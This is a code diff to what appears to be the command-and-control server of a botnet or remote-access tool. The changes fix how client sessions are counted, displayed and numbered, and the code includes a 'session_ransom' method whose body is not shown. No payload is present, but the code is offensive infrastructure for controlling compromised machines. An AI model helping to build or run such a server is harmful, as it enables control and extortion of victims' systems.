@@ -662,7 +662,7 @@ class C2():
             _ = self.sessions.pop(int(session_id), None)
             # update persistent database
             self.database.update_status(session.info.get('uid'), 0)
-            if self.current_session != None and int(session_id) != self.current_session.info.get('id'):
+            if self.current_session != None and int(session_id) != self.current_session.id:
                 with self.current_session._lock:
                     util.display('Session {} disconnected'.format(session_id))
                 self._active.clear()
@@ -703,9 +703,10 @@ class C2():
         lock = self.current_session._lock if self.current_session else self._lock
         with lock:
             print()
-            for idx, ses in self.sessions.items():
+            for ses in self.sessions.values():
+                util.display(str(ses.id), color='white', style='normal')
                 self.database._display(ses.info)
-            print()
+                print()
 
     def session_ransom(self, args=None):
         """
@@ -775,18 +776,16 @@ class C2():
         for session_info in self.database.get_sessions(verbose=True):
             self.database.update_status(session_info.get('uid'), 0)
             session_info['online'] = False
-#            self.sessions[session_info.get('id')] = { "info": session_info, "connection": None }
-            self._count += 1
         while True:
             connection, address = self.socket.accept()
             session = Session(connection=connection, id=self._count)
             if session.info != None:
                 info = self.database.handle_session(session.info)
                 if isinstance(info, dict):
+                    self._count += 1
                     if info.pop('new', False):
                         util.display("\n\n[+]", color='green', style='bright', end=' ')
                         util.display("New Connection:", color='white', style='bright', end=' ')
-                        self._count += 1
                     else:
                         util.display("\n\n[+]", color='green', style='bright', end=' ')
                         util.display("Connection:", color='white', style='bright', end=' ')
@@ -872,7 +871,7 @@ class Session(threading.Thread):
 
     """
 
-    def __init__(self, connection=None, id=1):
+    def __init__(self, connection=None, id=0):
         """
         Create a new Session
 
@@ -895,7 +894,7 @@ class Session(threading.Thread):
         self.rsa = None  # security.Crypto.PublicKey.RSA.generate(2048)
         try:
             self.info = self.client_info()
-            self.info['id'] = self.id
+            #self.info['id'] = self.id
         except Exception as e:
             print(bytes(e))
             self.info = None
